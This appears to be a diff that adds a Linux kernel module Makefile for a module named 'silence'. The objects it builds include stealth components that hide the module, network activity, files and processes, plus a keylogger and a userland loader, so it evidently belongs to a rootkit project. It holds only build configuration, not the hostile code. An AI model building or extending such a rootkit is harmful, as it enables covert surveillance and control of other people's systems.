@@ -1,0 +1,19 @@
+MODULE_NAME 		:= silence
+obj-m  				:= ${MODULE_NAME}.o
+
+
+${MODULE_NAME}-y 	+= init.o
+${MODULE_NAME}-y 	+= utils/socket.o
+${MODULE_NAME}-y 	+= stealth/hidelkm.o
+${MODULE_NAME}-y 	+= stealth/hidenetwork.o
+${MODULE_NAME}-y 	+= stealth/hidefs.o
+${MODULE_NAME}-y 	+= stealth/hideproc.o
+${MODULE_NAME}-y 	+= implant/keylogger.o
+${MODULE_NAME}-y 	+= implant/userloader.o
+
+ccflags-y := -Wall -Wextra -ansi -pedantic
+
+
+ccflags-y := -I../include
+ccflags-y := -I../include/implant
+ccflags-y := -I../include/stealth
